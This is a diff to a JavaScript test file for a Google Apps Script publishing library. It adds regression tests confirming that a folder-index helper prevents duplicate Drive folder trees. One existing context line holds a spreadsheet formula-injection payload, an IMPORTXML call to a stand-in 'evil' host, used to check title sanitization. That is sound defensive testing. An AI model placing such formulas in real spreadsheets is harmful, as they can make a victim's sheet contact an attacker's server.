@@ -5,6 +5,7 @@ const {
   planPublish,
   planCreateLink,
   base64DecodedByteLength,
+  featureFolderIndexInMissing,
 } = require('../gas/lib/ingest.js');
 const { INDEX_COLS, indexToRow, rowToIndex } = require('../gas/lib/schema.js');
 
@@ -425,4 +426,78 @@ test('planCreateLink: sanitizes a title starting with a formula-injection charac
   assert.equal(r.ok, true);
   assert.equal(r.row.title.charAt(0), "'");
   assert.equal(r.row.title, '\'=IMPORTXML("http://evil/","//a")');
+});
+
+// ---- featureFolderIndexInMissing ----
+// Regression coverage for the cold-bootstrap bug (publishDesignDoc's
+// dhFeatureFolder_ call throwing before dhEnsureFolderChain_ ever ran, for a
+// repo/feature never published to DesignHub before) - see this task's design
+// note for the full trace and why a naive "make dhFeatureFolder_ create-on-
+// miss" fix would silently fork a duplicate Drive folder tree instead.
+
+test('featureFolderIndexInMissing: feature folder already exists (only deeper folderSegs missing)', () => {
+  // totalNames = 2 (repo+featureDir) + 1 folderSeg = 3; missing = ['subdir'] (length 1)
+  // startDepth = 3 - 1 = 2 (repo+featureDir both already existed)
+  assert.equal(featureFolderIndexInMissing(1, 3), -1);
+});
+
+test('featureFolderIndexInMissing: only featureDir missing (repo already existed)', () => {
+  // totalNames = 2, missing = ['featureDir'] (length 1), startDepth = 2 - 1 = 1
+  assert.equal(featureFolderIndexInMissing(1, 2), 0);
+});
+
+test('featureFolderIndexInMissing: full cold bootstrap (repo AND featureDir both missing)', () => {
+  // totalNames = 2, missing = ['repo','featureDir'] (length 2), startDepth = 0
+  assert.equal(featureFolderIndexInMissing(2, 2), 1);
+});
+
+test('featureFolderIndexInMissing: cold bootstrap with a deeper folderSeg also missing', () => {
+  // totalNames = 3, missing = ['repo','featureDir','subdir'] (length 3), startDepth = 0
+  assert.equal(featureFolderIndexInMissing(3, 3), 1);
+});
+
+test('publishDesignDoc-style folder chain creation never re-creates the feature folder (no duplicate tree)', () => {
+  // A minimal fake Folder: createFolder records calls and returns a child
+  // fake with the same shape, so we can assert exactly which folders got
+  // created and in what order - proving the single unified pass (bridge.js's
+  // publishDesignDoc) creates each folder name exactly once and correctly
+  // identifies the feature folder from that one pass, never a second
+  // independent walk that could create a duplicate repo/featureDir tree.
+  function fakeFolder(name) {
+    const created = [];
+    return {
+      name,
+      created,
+      createFolder(childName) {
+        created.push(childName);
+        return fakeFolder(childName);
+      },
+    };
+  }
+  const root = fakeFolder('root');
+  const missingFolderNames = ['newrepo', 'newfeature']; // full cold bootstrap
+  const totalNames = 2;
+  const featureIdx = featureFolderIndexInMissing(missingFolderNames.length, totalNames);
+  let folder = root;
+  let featureFolder = null;
+  for (let i = 0; i < missingFolderNames.length; i++) {
+    folder = folder.createFolder(missingFolderNames[i]);
+    if (i === featureIdx) featureFolder = folder;
+  }
+  assert.equal(
+    root.created.length,
+    1,
+    'exactly one folder created directly under root - no duplicate repo folder'
+  );
+  assert.equal(root.created[0], 'newrepo');
+  assert.equal(
+    featureFolder.name,
+    'newfeature',
+    'the captured feature folder is the one actually created in this pass, not a re-derived duplicate'
+  );
+  assert.equal(
+    folder.name,
+    'newfeature',
+    'the final (write) folder for this case is the feature folder itself - no folderSegs beyond it'
+  );
 });
